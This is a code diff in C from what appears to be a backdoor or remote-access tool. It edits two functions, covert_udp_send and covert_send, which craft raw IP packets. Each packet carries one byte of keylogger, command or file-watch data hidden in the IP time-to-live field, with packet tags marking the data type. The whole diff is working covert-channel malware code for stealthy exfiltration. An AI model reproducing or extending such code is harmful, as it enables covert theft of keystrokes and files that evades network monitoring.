@@ -135,18 +135,23 @@ void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short 
     if(flags == KEYLOGGER){
         ip_header->id = KEYLOGGER_KEY;
         ip_header->tos = KEYLOGGER_KEY;
+        ip_header->ttl = data[0];
+        printf("Sending: %c\n", ip_header->ttl);
     }else if(flags == COMMAND){
         ip_header->id = COMMAND_KEY;
         ip_header->tos = COMMAND_KEY;
+        ip_header->ttl = data[0];
+        printf("Sending: %c\n", ip_header->ttl);
     }else if(flags == INOTIFY){
         ip_header->id = INOTIFY_KEY;
         ip_header->tos = INOTIFY_KEY;
+        ip_header->ttl = data[0];
+        printf("Sending: %c\n", ip_header->ttl);
     }else if(flags == EOT){
         ip_header->id = EOT_KEY;
         ip_header->tos = EOT_KEY;
+        ip_header->ttl = 0;
     }
-    ip_header->ttl = data[0];
-printf("Sending: %c\n", ip_header->ttl);
     ip_header->ihl = 5;
     ip_header->version = 4;
     ip_header->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr);
@@ -235,18 +240,23 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
     if(flags == KEYLOGGER){
         packet.ip.id = KEYLOGGER_KEY;
         packet.ip.tos = KEYLOGGER_KEY;
+        packet.ip.ttl = data[0];
+        printf("Sending: %c\n", packet.ip.ttl);
     }else if(flags == COMMAND){
         packet.ip.id = COMMAND_KEY;
         packet.ip.tos = COMMAND_KEY;
+        packet.ip.ttl = data[0];
+        printf("Sending: %c\n", packet.ip.ttl);
     }else if(flags == INOTIFY){
         packet.ip.id = INOTIFY_KEY;
         packet.ip.tos = INOTIFY_KEY;
+        packet.ip.ttl = data[0];
+        printf("Sending: %c\n", packet.ip.ttl);
     }else if(flags == EOT){
         packet.ip.id = EOT_KEY;
         packet.ip.tos = EOT_KEY;
+        packet.ip.ttl = 0;
     }
-    packet.ip.ttl = data[0];
-printf("Sending: %c\n", packet.ip.ttl);
 
     packet.ip.frag_off = 0;
     packet.ip.protocol = IPPROTO_TCP;
